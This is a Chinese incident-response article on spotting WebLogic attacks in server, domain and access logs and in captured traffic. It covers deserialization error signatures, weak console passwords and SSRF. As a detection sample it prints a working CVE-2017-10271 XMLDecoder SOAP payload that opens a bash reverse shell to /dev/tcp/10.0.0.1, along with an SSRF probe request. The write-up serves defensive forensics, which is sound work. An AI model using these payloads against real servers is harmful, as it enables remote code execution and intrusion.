# 基于攻击流量和日志对Weblogic各类漏洞的分析思路

阅读量 **493903**

|评论 **17**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-04-03 16:00:49

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01da2ccf5dfa42207b.jpg)

## 前言

在最近的几次应急响应中，基于Weblogic反序列化漏洞的攻击是非常常见的攻击手段，于是在应急响应结束之余我希望将实战中的一些分析经验和思路进行总结，提炼出一套Weblogic类漏洞攻击的分析思路和方法。在这篇文章中，我将跟大家总结Weblogic日志基础知识，以及如何利用Weblogic攻击流量和日志深度分析和挖掘Weblogic的4种漏洞攻击场景。

## 一、“九层之台起累土”— Weblogic环境搭建和日志分析基础

WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVA EE架构的中间件,
WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。正因为WebLogic应用实在太广泛了，被“贼”时刻惦记着，所以漏洞和攻击也是简直不要太多。

###  Weblogic环境搭建

在对Weblogic漏洞攻击场景进行分析之前，为了方便演示和大家练习，我先搭建一个标准的Weblogic环境：

  1. 使用Centos7和JDK1.7搭建Weblogic10.3.6  
Weblogic下载地址：  
<http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar>

  2. 执行java -jar wls1036_generic.jar
  3. 选择一个Middleware目录：  

  4. 记得取消更新  

  5. 接下来选择Typical安装即可，选择jdk目录，server目录默认即可，等待安装完成。

**新建Weblogic 域**

  1. 使用默认选项下一步安装即可，
  2. 在设置域启动模式时选择生产模式：  

  3. 最后 一直下一步安装即可

###  Weblogic日志总结

Weblogic日志主要分为Server日志、HTTP日志和DOMAIN日志。

####  Server日志

路径位置：`DOMAIN_NAMEserversSERVER_NAMElogsSERVER_NAME.log`

默认为`DOMAIN_NAMEserversAdminServerlogsAdminServer.log`

它的作用是记录Weblogic Server启动至关闭过程中的运行信息和错误信息

示例：

    
    
    ####<Mar 4, 2019 9:42:07 AM CST> <Warning> <RMI> <localhost.localdomain> <AdminServer> <[ACTIVE] ExecuteThread: '4' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1551663727980> <BEA-080003> <RuntimeException thrown by rmi server: weblogic.common.internal.RMIBootServiceImpl.authenticate(Lweblogic.security.acl.UserInfo;)
    

依次为：时间戳、严重程度、子系统、计算机名、服务器名、线程 ID、用户 ID、事务 ID、诊断上下文 ID、原始时间值、消息 ID 和消息文本

Server日志在控制台设置如下：

在Weblogic终端左侧菜单:环境–>服务器，在右侧菜单:服务器–>日志记录 – >一般信息 可设置记录日志的最低级别（默认为Trace）：

![](https://p0.ssl.qhimg.com/t01f60c947044dd408d.png)

####  HTTP日志

路径位置：`DOMAIN_NAMEserversSERVER_NAMElogsaccess.log`

它的作用是记录Weblogic对用HTTP、HTTPS协议访问的服务器上的文件，该文件具体记录在某个时间，某个IP地址的客户端访问了服务器上的某个文件。

示例

    
    
    172.16.112.1 - - [04/Mar/2019:14:44:43 +0800] "GET /untitled_war/ HTTP/1.1" 200 98
    

HTTP日志在控制台设置如下：

在weblogic控制台左侧菜单:环境–>服务器，在右侧菜单:服务器–>日志记录 – >HTTP 高级选项下，选择日志文件缓冲区为“0”可实时记录日志。

####  DOMAIN日志

路径位置：`DOMAIN_NAMEserversSERVER_NAMElogsDOMAIN_NAME.log`

默认为：`DOMAIN_NAMEserversAdminServerlogsbase_domain.log`

它的作用是记录一个DOMAIN下的各个Weblogic Server的启动至关闭过程中的运行信息和错误信息。

示例：（与Server日志类似）

    
    
    ####<Mar 18, 2019 5:43:26 PM CST> <Notice> <Log Management> <localhost.localdomain> <AdminServer> <[STANDBY] ExecuteThread: '1' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1552902206737> <BEA-170027> <The Server has established connection with the Domain level Diagnostic Service successfully.>
    

格式为：时间戳、严重程度、子系统、计算机名、服务器名、线程 ID、用户 ID、事务 ID、诊断上下文 ID、原始时间值、消息 ID 和消息文本。

需要说明的一点：

DOMAIN日志中记录的时间戳是发出消息的服务器的时间戳。Domain日志中的日志记录不会按照其时间戳顺序写入；其会在消息到达后立即将其写入。有可能服务器在一段时间内无法与域服务器联系。此时，消息会被缓冲在本地并在重新连接服务器之后发送到管理服务器。

## 二、“拨开云雾见青天”— 4种Weblogic攻击分析思路

###  Weblogic反序列化漏洞日志分析

Weblogic反序列化漏洞可以说是非常常见的了，CVE编号就有CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3191等等之多。

我的分析思路是：因为使用反序列化漏洞入侵，HTTP日志是不会记录访问Shell行为的，所以要通过Domain日志或服务器日志先查看报错日志：

**socket连接示例**

![](https://p4.ssl.qhimg.com/t01bd56b8a3e0212393.png)

**文件操作示例**

![](https://p5.ssl.qhimg.com/t01604935f409519ddd.png)

Weblogic会响应攻击者发送的payload请求，所以可以抓取攻击流量，在流量记录中可以看到攻击者上传的Webshell：

![](https://p2.ssl.qhimg.com/t01e9f0e5e9e3d9e643.png)

![](https://p4.ssl.qhimg.com/t01516f5e62156ec445.png)

上传的Webshell地址一般为：

`/home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/*`

然后再通过Server日志报错判断漏洞类型：

位置（通常在java.lang.ClassCastException后）：

    
    
    ####<Mar 26, 2019 9:13:34 AM EDT> <Warning> <RMI> <localhost.localdomain> <AdminServer> <[ACTIVE] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1553606014109> <BEA-080003> <RuntimeException thrown by rmi server: weblogic.common.internal.RMIBootServiceImpl.authenticate(Lweblogic.security.acl.UserInfo;)
     java.lang.ClassCastException: $Proxy91 cannot be cast to weblogic.rjvm.ClassTableEntry.
    java.lang.ClassCastException: $Proxy91 cannot be cast to weblogic.rjvm.ClassTableEntry
        at weblogic.rjvm.MsgAbbrevInputStream.readClassDescriptor(MsgAbbrevInputStream.java:405)
        at weblogic.utils.io.ChunkedObjectInputStream$NestedObjectInputStream.readClassDescriptor(ChunkedObjectInputStream.java:278)
    

不同漏洞利用类型的对应报错内容如下：

报错内容 | 漏洞利用类型  
---|---  
org.apache.commons.collections | Apache Commons Collections类  
java.util.LinkedHashSet | jdk小于Jdk7u21  
weblogic.jms.common.StreamMessageImpl | StreamMessageImpl接口  
$Proxy | JRMP(java.rmi.registry.Registry java.rmi.activation.Activator)  
springframework.transaction.TransactionSystemException/springframework.transaction.jta.JtaTransactionManager
| CVE-2018-3191Spring JNDI反序列化  
  
截图示例：

**Apache Commons Collections：**

![](https://p3.ssl.qhimg.com/t01f54a2033ca3ac8ce.png)

**Proxy：**

![](https://p2.ssl.qhimg.com/t01d85377511c680e1a.png)

**StreamMessageImpl接口** ：

![](https://p0.ssl.qhimg.com/t01d1d9bd662aeea073.png)

**Java.util.LinkedHashSet:**

![](https://p0.ssl.qhimg.com/t01b9fecdd523289b8a.png)

**Spring JNDI：**

![](https://p4.ssl.qhimg.com/t0104cb077776f9dd30.png)

部分流量截图

**JRMP(java.rmi.registry.Registry java.rmi.activation.Activator)**

![](https://p0.ssl.qhimg.com/t019fddb41599fd887f.png)

**StreamMessageImpl**

![](https://p0.ssl.qhimg.com/t016bc227ed5880f28f.png)

**Spring JNDI：**

![](https://p0.ssl.qhimg.com/t0177e451f9c31daa44.png)

**Apache Commons Collections**

![](https://p5.ssl.qhimg.com/t01e9ea64be4e24d257.png)

###  WLS组件命令执行日志分析

XMLDecoder 反序列化漏洞的CVE编号为CVE-2017-10271，但是XMLDecoder
反序列化漏洞的Server、DOMAIN与access均无日志产生，所以只能通过流量抓取，识别payload示例：

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash-i&gt;&amp;/dev/tcp/10.0.0.1/21 0&gt;&amp;1</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

以某次应急案例为例分析：攻击者利用CVE-2017-10271漏洞，攻击Weblogic服务；根据流量记录可见请求体内容的开头为：

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    

![](https://p3.ssl.qhimg.com/t013ea94d34a641497d.png)

攻击者上传1q.jsp文件

![](https://p4.ssl.qhimg.com/t01218b0d698f9cc0c9.png)

攻击者上传后门文件t00ls.jsp;

![](https://p3.ssl.qhimg.com/t0164b4335595a76ddc.png)

攻击者使用1q.jsp后门文件读取用户文件

###  Weblogic后台弱口令日志分析

弱口令问题被称为是网络安全中的第一大隐患一点也不夸张，那么针对Weblogic后台弱口令漏洞我们该怎么分析呢？答案是查看AdminServer.log日志，搜索包含Webshell文件名的war字串，可判断是否是console弱口令。

![](https://p2.ssl.qhimg.com/t01f13b182fa5a31015.png)

另外，通过Weblogic控制台部署的Webshell，access.log会记录访问其日志，所以
可以查找access.log找到Webshell具体位置：

![](https://p2.ssl.qhimg.com/t015075626fab468138.png)

###  Weblogic SSRF漏洞日志分析

Weblogic SSRF漏洞在Server、DOMAIN与access中均无日志记录，只能通过分析流量：

    
    
    /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=qqq&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=
    

若存在漏洞，返回包中包含：

    
    
    An error has occurred
    weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server:
    

若漏洞请求的为非HTTP服务时，返回：

    
    
    An error has occurred
    weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://127.0.0.1:22 which did not have a valid SOAP content-type: null.
    

截图示例：

![](https://p3.ssl.qhimg.com/t01afa1c76a371afc78.png)

![](https://p5.ssl.qhimg.com/t01bebee6e961fd3a6d.png)

## 三、“而今迈步从头越”— 总结

以上针对网络攻击中常见的4种Weblogic漏洞场景进行了攻击流量和日志方面的分析总结，但是Weblogic的漏洞分析远远没有就此结束，正所谓“雄关漫道真如铁，而今迈步从头越”，在其他类型或新出现的Weblogic漏洞攻击中，只要了解了Weblogic日志和漏洞原理，分析思路和方法则“万变不离其宗”，很惭愧，就做了一点微小的工作。谢谢大家。

## 后记-关于作者

360企业安全集团安全服务团队的一员，专注于应急响应、攻防研究和漏洞分析，一个在安全的大坑里匍匐前行的小菜鸡。

参考链接：

<http://www.xifenfei.com/2012/03/weblogic%E7%9B%B8%E5%85%B3%E6%97%A5%E5%BF%97%E4%BB%8B%E7%BB%8D.html>  
<https://github.com/frohoff/ysoserial>  
<http://xxlegend.com/2018/06/20/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/>  
<http://blog.nsfocus.net/weblogic-sharing/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **zzin1** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/175738](/post/id/175738)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [Weblogic](/tag/Weblogic)

 **+1** __10赞

 __收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg) zzin1

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

